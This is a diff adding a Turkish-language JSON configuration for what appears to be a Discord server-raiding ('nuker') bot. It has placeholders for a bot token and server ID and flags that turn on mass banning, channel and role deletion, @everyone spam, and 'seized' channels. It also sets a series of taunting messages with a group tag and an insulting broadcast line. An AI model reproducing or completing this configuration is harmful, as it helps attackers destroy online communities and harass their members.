@@ -1,0 +1,22 @@
+{
+  "token": "xxx",
+  "sunucu_id": "xxx",
+  "otomasyon": {
+    "banla": true,
+    "kickle": false,
+    "kanal_sil": true,
+    "el_konuldu_kanallari_olustur": true,
+    "rol_sil": true,
+    "everyone_spam": true
+  },
+  "el_konuldu_mesajlari": [
+    "en",
+    "çokda",
+    "neye gülüyorum",
+    "biliyormusun",
+    "duvardaki adalet.",
+    "yazısına",
+    "#brx"
+  ],
+  "everyone_message": "ucube!"
+}
